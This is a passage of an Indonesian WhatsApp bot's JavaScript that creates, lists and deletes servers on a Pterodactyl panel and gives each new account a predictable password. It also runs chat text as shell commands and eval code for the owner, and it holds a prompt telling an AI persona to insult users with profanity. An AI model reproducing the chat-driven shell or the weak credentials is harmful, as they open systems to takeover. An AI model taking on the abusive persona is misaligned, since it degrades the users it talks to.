let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '9gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case "listsrv": {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await ekuzika.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('Server tidak ditemukan')
reply('Berhasil minghapus Server.')
}
break
 
case 'totalfitur': {
ngaceng = fs.readFileSync("./ebpcrash.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await ekuzika.fetchBlocklist()
let gcall = Object.values(await ekuzika.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii ${pushname}*

𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*`)
}
break
/*
case 'xnxxsearch': {
			if (!text) return m.reply(`Kirim Judul Bokep`)
			try {
				const fg = require('api-dylux')
				let res = await fg.xnxxSearch(text)
				m.reply(mess.wait)
				let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
				if (res.status) m.reply(ff)
				
			} catch (error) {
				console.error(error);
				m.reply('Yah Error');
			}
		}
		break
case 'xnxxdl': {
			if (!text) return m.reply(`Kirim Link Bokep di situs XNXX`)
			if (!text.includes('xnxx.com')) return m.reply(`Kirim Link Bokep di situs XNXX`)
			try {
			m.reply(mess.wait)
				const fg = require('api-dylux')
				let xn = await fg.xnxxdl(text)
				let tobatrek = `*XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`
await rioo.replyWithVideo({
            url: xn.url_dl,
            },{
            caption: tobatrek,
        })
			} catch (error) {
				console.error(error);
				m.reply('Yah Error');
			}
		}
		break

case "tts":
        {
          if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          ekuzika.sendMessage(m.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          })
        }
        break;

case 'solver': {
	if (!text) return m.reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
await ekuzika.sendMessage(m.chat, { react: { text: "🌚",key: m.key,}}) 
  if (/image/.test(mime)) {
    const media = await sock.downloadAndSaveMediaMessage(quoted)
 	  let anuu = await pomfCDN(media)
    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
    const aimsg = data.result;
    m.reply(`${aimsg}`)
}
}
break

case 'removebg':
  //if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
  if (/image/.test(mime)) {
m.reply(mess.wait)
  let mee = await m.downloadAndSaveMediaMessage(quoted)
  let mem = await shannzCdn(mee)
  let url = mem.result.url;
  let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=YOUR-KEY&url=${url}`)).json()
  let bg = shannz.result.image
  ekuzika.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break

case 'ttsearch': {
async function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        m.reply("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        m.reply(result);
      }
    } catch (error) {
      m.reply(error);
    }
  });
}
  if (!text) return m.reply(`• Example : .${command} separuh aku`)
  let yoiii = await tiktoks(`${text}`)
  await m.replyWithVideo({
            url: yoiii.no_watermark,
            },{
            caption: '```Result from:```'+' `'+text+`'`+'``Done Ya```'
        })
}
break*/
            case 'tt':
            case 'tiktok': {
				if (!text) return reply(`*Example :* \n\n*${prefix + command} Link Url*`)
				if (!text.includes('tiktok.com')) return reply('Url Tidak Mengandung Result Dari Tiktok!')
				reply(mess.wait)
			    const { v1 } = require('node-tiklydown')
			    try {
			    const ttdlny = await v1(text)
			    const { title, created_at, stats, video, author } = ttdlny
			    const { likeCount, commentCount, shareCount, playCount, saveCount } = ttdlny.stats
			    const { name, unique_id } = ttdlny.author
			    const cpt = `[ *T I K T O K* ]\n\nUsername: @${unique_id}\nCaption: ${title}\n❤️ ${likeCount} Suka\n💬 ${commentCount} Komentar\n📎 ${shareCount} diBagikan`
			    ekuzika.sendMessage(m.chat, { video: { url: video.noWatermark }, caption: cpt }, { quoted: fpay })
			} catch (e) {
			  reply("Error pada bagian :" + e)
			}
		}
			break
			case 'ttslide': 
			case 'tiktokslide': {
				//if (!isPremium) return reply(mess.premium)
				if (!text) return reply(`*Example:*\n\n*Ttmp3 Link Url*`)
				if (!text.includes('tiktok.com')) return reply('Url Tidak Mengandung Result Dari Tiktok!')
				try {
			    const { v4 } = require('node-tiklydown')
			    const ttv4 = await v4(text)
			    const { desc, author, type, stats, audio } = ttv4.result
			    const ptx = `[ *T I K T O K* ]\n\nUsername: ${author.username}\nCaption: ${desc}\n❤️ ${stats.likeCount} Suka\n💬 ${stats.commentCount} Komentar\n📎 ${stats.shareCount} diBagikan`
			    for (let i = 0; i < ttv4.content; i++) {
			        ekuzika.sendMessage(m.chat, { image: { url: ttv4.content[i] }, caption: ptx }, { quoted: fkontak })
			        ekuzika.sendMessage(m.chat, { audio: { url: audio.url }, mimetype: "audio/mp4", ptt: true })
			        }
			    } catch (e) {
			    reply("Seperti nya server sedang error: " + e )
			    }
			}
			break
	//=================================================//
	/*
case "get": {
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
//let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return ekuzika.sendFile(m?.chat, url, 'file', `*Link:* ${text}\n\n2024 © ebpcrash`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
reply(txt.slice(0, 65536) + '')
}
}
break
	case 'yt':
	case 'ytdl':
	case 'ytmp3':
	case 'ytmp4':
	if (!text) return reply(`*Example :\n${prefix+command} https://youtu.be/iik25wqIuFo`)
	if (text.includes('youtu')) return reply('*Itu bukan link Yt!*')
	try {
	    let liyt = await (await fetch(`https://itzpire.com/download/youtube?url=${text}`)).json();
	    let capt += `*Youtube Downloader`
	    let capt += ``
	} catch (err) {
	    reply('*Sementara fitur sedang error.*')
	}
	break
case 'play-spotify':
 if (!text) return m.reply('mau cari lagu apa?');
 try {
 let spo = await (await fetch('https://endpoint.web.id/search/spotify?key=YOUR-KEY&query=' + text)).json();
 if (spo.status && spo.result.length > 0) {
 let randomIndex = Math.floor(Math.random() * spo.result.length);
 let track = spo.result[randomIndex];
 let dls = await (await fetch('https://endpoint.web.id/downloader/spotify?key=shz&url=' + track.link)).json();
 let shannz = dls.result;
 
 await ekuzika.sendMessage(m.chat, { 
 audio: { 
 url: shannz.music
 }, 
 mimetype: 'audio/mp4', contextInfo: {
 externalAdReply: {
 title: shannz.title,
 body: `Author : ${shannz.author}`,
 thumbnailUrl: shannz.thumbnail,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: true,
 },
 }, 
 }, { quoted: m });
 } else {
 m.reply('No results found.');
 }
 } catch (e) {
 m.reply('shannz rest api sedang erorr');
 }
 break*/

default:
}

if (budy.startsWith('$')) {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
exec(budy.slice(2), (err, stdout) => {
if(err) return ekuzika.sendMessage(m.chat, {text: err.toString()}, {quoted: fkontak})
if (stdout) return ekuzika.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: fkontak})
})}

if (budy.startsWith(">")) {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
ekuzika.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: fkontak})
} catch (e) {
ekuzika.sendMessage(m.chat, {text: util.format(e)}, {quoted: fkontak})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return ekuzika.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: fkontak})
} catch (e) {
return ekuzika.sendMessage(m.chat, {text: util.format(e)}, {quoted: fkontak})
}}

ekuzika.CAI = ekuzika.CAI ? ekuzika.CAI : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!ekuzika.CAI[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (ekuzika.CAI[sender] && m.text) {
        let name = ekuzika.getName(sender);
        //await ekuzika.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        try {
            //const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            //const V = await C("https://cai.neekoi.me/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat2));
            //const L = await V.json();
            //const answer = L.reply;
            //m.reply(answer)
            const axios = require('axios')
const { data } = await axios({
    "method": "GET",
    "url": "https://mannoffc-x.hf.space/ai/prompt",
    "params": {
      "prompt": "Nama kamu adalah Ebp-Ai, kamu adalah AI yang dikembangkan oleh Ekuzika, saat chat dengan user kamu menggunakan emoji agar lebih menarik, kamu menjawab dengan emosi dan ucapan kasar seperti kontol, goblok, tolol, anjing, bangsat, asu, ngentot, dll.",
      "message": spychat2
    }
  })
  reply(data.result);
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan.");
        }
    }
/*
if (budy.startsWith('=>')) {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('$')) {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}*/
} catch (e) {
console.log(e)
ekuzika.sendMessage(`${owner}@s.whatsapp.net`, {text:`Sepertinya ada yg error tuanku : \n\n${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})